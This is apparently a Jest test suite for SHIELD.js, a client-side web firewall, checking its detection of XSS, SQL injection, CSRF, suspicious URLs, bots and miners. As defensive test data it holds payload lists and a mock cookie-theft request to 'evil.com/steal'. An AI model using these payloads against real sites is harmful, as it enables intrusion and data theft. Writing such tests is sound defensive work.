/**
 * SHIELD.js Test Suite
 * Comprehensive testing with attack simulations and security validations
 */

import shield from '../src/shield-firewall.js';

// Mock DOM elements for testing
global.document = {
  body: {
    appendChild: jest.fn(),
    removeChild: jest.fn(),
    querySelector: jest.fn(),
    querySelectorAll: jest.fn(() => []),
    addEventListener: jest.fn(),
    dispatchEvent: jest.fn()
  },
  createElement: jest.fn(() => ({
    setAttribute: jest.fn(),
    appendChild: jest.fn(),
    addEventListener: jest.fn(),
    classList: {
      add: jest.fn(),
      remove: jest.fn(),
      contains: jest.fn(),
      toggle: jest.fn()
    },
    style: {},
    querySelector: jest.fn(),
    querySelectorAll: jest.fn(() => [])
  })),
  head: {
    appendChild: jest.fn()
  },
  documentElement: {
    outerHTML: '<html><body></body></html>',
    innerHTML: ''
  },
  addEventListener: jest.fn(),
  removeEventListener: jest.fn()
};

// Mock window
global.window = {
  fetch: jest.fn(),
  XMLHttpRequest: jest.fn(),
  location: { href: 'https://example.com' },
  navigator: { userAgent: 'Test Browser' },
  crypto: {
    subtle: {
      digest: jest.fn(),
      generateKey: jest.fn(),
      encrypt: jest.fn(),
      decrypt: jest.fn(),
      importKey: jest.fn()
    },
    getRandomValues: jest.fn()
  },
  indexedDB: {
    open: jest.fn()
  },
  MutationObserver: jest.fn(),
  addEventListener: jest.fn(),
  removeEventListener: jest.fn()
};

// Mock localStorage
global.localStorage = {
  getItem: jest.fn(),
  setItem: jest.fn(),
  removeItem: jest.fn(),
  clear: jest.fn()
};

describe('SHIELD.js Firewall Tests', () => {
  beforeEach(async () => {
    // Reset all mocks
    jest.clearAllMocks();

    // Reset SHIELD instance
    if (shield.isInitialized) {
      await shield.reset();
    }
  });

  describe('Initialization', () => {
    test('should initialize successfully', async () => {
      const success = await shield.initialize();
      expect(success).toBe(true);
      expect(shield.isInitialized).toBe(true);
    });

    test('should start protection after initialization', async () => {
      await shield.initialize();
      const started = await shield.start();
      expect(started).toBe(true);
      expect(shield.isActive).toBe(true);
    });

    test('should get correct status', async () => {
      await shield.initialize();
      const status = shield.getStatus();
      expect(status.initialized).toBe(true);
      expect(status.version).toBe('1.0.0');
    });
  });

  describe('XSS Attack Prevention', () => {
    beforeEach(async () => {
      await shield.initialize();
      await shield.start();
    });

    test('should block script injection', () => {
      const maliciousScript = '<script>alert("xss")</script>';
      document.body.innerHTML = maliciousScript;

      // Trigger DOM mutation
      const mockMutation = {
        type: 'childList',
        addedNodes: [document.createElement('script')]
      };

      // Simulate mutation observer callback
      expect(shield.domProtector).toBeDefined();
    });

    test('should sanitize dangerous HTML', () => {
      const dangerousHTML = '<img src=x onerror=alert(1)>';
      const sanitized = shield.domProtector.sanitizeHTML(dangerousHTML);
      expect(sanitized).not.toContain('onerror');
      expect(sanitized).toContain('<img src="x">');
    });

    test('should detect XSS patterns', () => {
      const xssPatterns = [
        '<script>evil()</script>',
        'javascript:alert(1)',
        '<iframe src="javascript:alert(1)"></iframe>',
        '<img src=x onerror=alert(1)>'
      ];

      xssPatterns.forEach(pattern => {
        const detected = shield.threatDetector.analyzeContent(pattern);
        expect(detected.score).toBeGreaterThan(0.5);
      });
    });
  });

  describe('SQL Injection Prevention', () => {
    beforeEach(async () => {
      await shield.initialize();
      await shield.start();
    });

    test('should detect SQL injection patterns', () => {
      const sqlPatterns = [
        '\'; DROP TABLE users; --',
        '\' OR \'1\'=\'1',
        'UNION SELECT * FROM users',
        '1; EXEC xp_cmdshell(\'dir\')'
      ];

      sqlPatterns.forEach(pattern => {
        const detected = shield.threatDetector.analyzeContent(pattern);
        expect(detected.score).toBeGreaterThan(0.7);
      });
    });

    test('should block malicious form submissions', () => {
      const maliciousFormData = '\' OR \'1\'=\'1\' --';
      const detected = shield.threatDetector.analyzeContent(maliciousFormData);
      expect(detected.blocked).toBe(true);
    });
  });

  describe('CSRF Protection', () => {
    beforeEach(async () => {
      await shield.initialize();
      await shield.start();
    });

    test('should detect CSRF tokens', () => {
      const requestWithoutToken = {
        url: '/api/transfer',
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ amount: 100, to: 'attacker' })
      };

      const analysis = shield.threatDetector.analyzeRequest(requestWithoutToken);
      expect(analysis.score).toBeGreaterThan(0.3);
    });

    test('should validate request origins', () => {
      const suspiciousHeaders = {
        'Referer': 'https://evil.com',
        'Origin': 'https://evil.com'
      };

      const detected = shield.threatDetector.checkHeaders(suspiciousHeaders);
      expect(detected.score).toBeGreaterThan(0.5);
    });
  });

  describe('Network Interception', () => {
    beforeEach(async () => {
      await shield.initialize();
      await shield.start();
    });

    test('should intercept fetch requests', async () => {
      const mockResponse = { ok: true, status: 200 };
      global.window.fetch.mockResolvedValue(mockResponse);

      const response = await fetch('/api/data');
      expect(global.window.fetch).toHaveBeenCalled();
      expect(response).toBe(mockResponse);
    });

    test('should block suspicious URLs', () => {
      const suspiciousUrls = [
        'javascript:alert(1)',
        'data:text/html,<script>alert(1)</script>',
        'vbscript:msgbox(1)',
        'http://evil.com/malicious' + 'a'.repeat(3000) // Very long URL
      ];

      suspiciousUrls.forEach(url => {
        const isSuspicious = shield.networkInterceptor.isSuspiciousUrl(url);
        expect(isSuspicious).toBe(true);
      });
    });

    test('should implement rate limiting', () => {
      const url = 'https://api.example.com/data';
      const domain = 'api.example.com';

      // Simulate multiple requests
      for (let i = 0; i < 120; i++) {
        shield.networkInterceptor.isRateLimited(url);
      }

      const isLimited = shield.networkInterceptor.isRateLimited(url);
      expect(isLimited).toBe(true);
    });
  });

  describe('Behavior Analysis', () => {
    beforeEach(async () => {
      await shield.initialize();
      await shield.start();
    });

    test('should track user interactions', () => {
      const interaction = {
        type: 'click',
        element: 'button',
        timestamp: Date.now(),
        position: { x: 100, y: 200 }
      };

      shield.behaviorEngine.recordInteraction(interaction);
      expect(shield.behaviorEngine.interactions.length).toBeGreaterThan(0);
    });

    test('should detect bot behavior', () => {
      // Simulate bot-like behavior
      for (let i = 0; i < 100; i++) {
        shield.behaviorEngine.recordInteraction({
          type: 'click',
          element: 'button',
          timestamp: Date.now() + i,
          position: { x: 100, y: 100 } // Same position repeatedly
        });
      }

      const isBot = shield.behaviorEngine.detectBot();
      expect(isBot).toBe(true);
    });

    test('should build behavior profile', async () => {
      const interactions = [
        { type: 'click', element: 'button', timestamp: Date.now() },
        { type: 'scroll', distance: 500, timestamp: Date.now() + 1000 },
        { type: 'input', field: 'username', timestamp: Date.now() + 2000 }
      ];

      interactions.forEach(interaction => {
        shield.behaviorEngine.recordInteraction(interaction);
      });

      const profile = shield.behaviorEngine.getProfile();
      expect(profile.interactions).toBeGreaterThan(0);
      expect(profile.avgInterval).toBeDefined();
    });
  });

  describe('Auto Recovery', () => {
    beforeEach(async () => {
      await shield.initialize();
      await shield.start();
    });

    test('should create DOM snapshots', () => {
      const snapshotId = shield.recoveryEngine.createSnapshot('test');
      expect(snapshotId).toBeDefined();
      expect(shield.recoveryEngine.snapshots.has(snapshotId)).toBe(true);
    });

    test('should quarantine suspicious elements', () => {
      const suspiciousElement = document.createElement('div');
      suspiciousElement.innerHTML = '<script>malicious()</script>';

      const quarantineId = shield.recoveryEngine.quarantineElement(suspiciousElement, 'test');
      expect(quarantineId).toBeDefined();
      expect(shield.recoveryEngine.quarantineZones.has(quarantineId)).toBe(true);
    });

    test('should restore from quarantine', () => {
      const element = document.createElement('div');
      element.textContent = 'Safe content';

      const quarantineId = shield.recoveryEngine.quarantineElement(element, 'test');
      const restored = shield.recoveryEngine.restoreFromQuarantine(quarantineId);

      expect(restored).toBe(true);
    });
  });

  describe('Configuration Management', () => {
    beforeEach(async () => {
      await shield.initialize();
    });

    test('should set protection levels', async () => {
      const success = await shield.setProtectionLevel('strict');
      expect(success).toBe(true);

      const config = shield.getConfig();
      expect(config.protectionLevel).toBe('strict');
    });

    test('should update configuration', async () => {
      const updates = {
        'threatDetection.sensitivity': 0.8,
        'features.domProtection': false
      };

      const success = await shield.configure(updates);
      expect(success).toBe(true);

      const config = shield.getConfig();
      expect(config.threatDetection.sensitivity).toBe(0.8);
      expect(config.features.domProtection).toBe(false);
    });

    test('should validate configuration', () => {
      const invalidConfig = {
        threatDetection: {
          sensitivity: 1.5 // Invalid: should be 0-1
        }
      };

      const validation = shield.config.validateConfig(invalidConfig);
      expect(validation.valid).toBe(false);
      expect(validation.errors.length).toBeGreaterThan(0);
    });
  });

  describe('Performance and Security', () => {
    beforeEach(async () => {
      await shield.initialize();
      await shield.start();
    });

    test('should maintain performance under load', async () => {
      const startTime = performance.now();

      // Simulate multiple threat checks
      for (let i = 0; i < 1000; i++) {
        shield.threatDetector.analyzeContent('normal content ' + i);
      }

      const endTime = performance.now();
      const duration = endTime - startTime;

      // Should complete within reasonable time (adjust threshold as needed)
      expect(duration).toBeLessThan(5000); // 5 seconds
    });

    test('should handle memory efficiently', () => {
      // Create many snapshots
      for (let i = 0; i < 20; i++) {
        shield.recoveryEngine.createSnapshot('performance_test');
      }

      // Should maintain max snapshots limit
      expect(shield.recoveryEngine.snapshots.size).toBeLessThanOrEqual(10);
    });

    test('should encrypt sensitive data', async () => {
      const sensitiveData = 'password123';
      const encrypted = await shield.config.storage.encrypt(sensitiveData);
      expect(encrypted).not.toBe(sensitiveData);
      expect(typeof encrypted).toBe('string');
    });
  });

  describe('Integration Tests', () => {
    test('should handle complete attack scenario', async () => {
      await shield.initialize();
      await shield.start();

      // Simulate XSS attack
      const xssAttack = '<script>document.cookie="session=evil"</script>';
      document.body.innerHTML = xssAttack;

      // Simulate network attack
      const maliciousRequest = {
        url: 'https://evil.com/steal?cookie=' + document.cookie,
        method: 'GET'
      };

      const requestAnalysis = shield.threatDetector.analyzeRequest(maliciousRequest);
      expect(requestAnalysis.score).toBeGreaterThan(0.5);

      // Check that protection is active
      const status = shield.getStatus();
      expect(status.active).toBe(true);
      expect(status.components.threatDetector).toBe(true);
    });

    test('should recover from attacks', async () => {
      await shield.initialize();
      await shield.start();

      // Create clean snapshot
      const snapshotId = shield.createSnapshot('clean_state');

      // Simulate attack
      document.body.innerHTML = '<script>malicious()</script>';

      // Trigger recovery
      const recovered = await shield.restoreFromSnapshot(snapshotId);
      expect(recovered).toBe(true);
    });
  });

  describe('Error Handling', () => {
    test('should handle initialization failures gracefully', async () => {
      // Mock a failure scenario
      global.window.indexedDB.open.mockImplementation(() => {
        throw new Error('Storage unavailable');
      });

      const success = await shield.initialize();
      // Should still initialize with degraded functionality
      expect(shield.isInitialized).toBe(true);
    });

    test('should continue operating with component failures', async () => {
      await shield.initialize();
      await shield.start();

      // Simulate component failure
      shield.behaviorEngine = null;

      // Should still function
      const status = shield.getStatus();
      expect(status.initialized).toBe(true);
      expect(status.active).toBe(true);
    });
  });

  describe('Privacy and Compliance', () => {
    beforeEach(async () => {
      await shield.initialize();
    });

    test('should anonymize logs when configured', () => {
      const config = shield.getConfig();
      expect(config.privacy.anonymizeLogs).toBe(true);
    });

    test('should respect data retention policies', () => {
      const retentionPeriod = shield.config.get('privacy.dataRetention');
      expect(retentionPeriod).toBeDefined();
      expect(retentionPeriod).toBeGreaterThan(0);
    });

    test('should not share data without consent', () => {
      const telemetryEnabled = shield.config.get('privacy.telemetry');
      expect(telemetryEnabled).toBe(false);
    });
  });
});

// Attack simulation helpers
export const attackSimulations = {
  xss: [
    '<script>alert("xss")</script>',
    '<img src=x onerror=alert(1)>',
    'javascript:alert(document.cookie)',
    '<iframe src="javascript:alert(1)"></iframe>',
    '<svg onload=alert(1)>',
    '<body onload=alert(1)>'
  ],

  sqlInjection: [
    '\' OR \'1\'=\'1\' --',
    '\'; DROP TABLE users; --',
    '\' UNION SELECT * FROM users --',
    '1; EXEC xp_cmdshell(\'dir\') --',
    '\' AND 1=0 UNION SELECT username, password FROM users --'
  ],

  csrf: [
    '<form action="/transfer" method="POST"><input name="amount" value="1000"><input name="to" value="attacker"></form>',
    'fetch("/api/transfer", {method: "POST", body: JSON.stringify({amount: 1000, to: "evil"})})',
    '<img src="/api/transfer?amount=1000&to=evil">'
  ],

  cryptoMining: [
    'var miner = new CoinHive.Anonymous',
    'cryptonight',
    'webassembly',
    'miner.start()',
    'coinhive.min.js'
  ],

  phishing: [
    'login.php?redirect=evil.com',
    'password reset link',
    'verify your account',
    'security alert',
    'update payment information'
  ]
};

export const performanceBenchmarks = {
  threatDetection: {
    sampleSize: 1000,
    maxTime: 100, // ms
    maxMemory: 50 * 1024 * 1024 // 50MB
  },

  networkInterception: {
    concurrentRequests: 100,
    maxLatency: 50, // ms
    throughput: 1000 // requests/second
  },

  behaviorAnalysis: {
    interactions: 10000,
    analysisTime: 500, // ms
    accuracy: 0.95
  }
};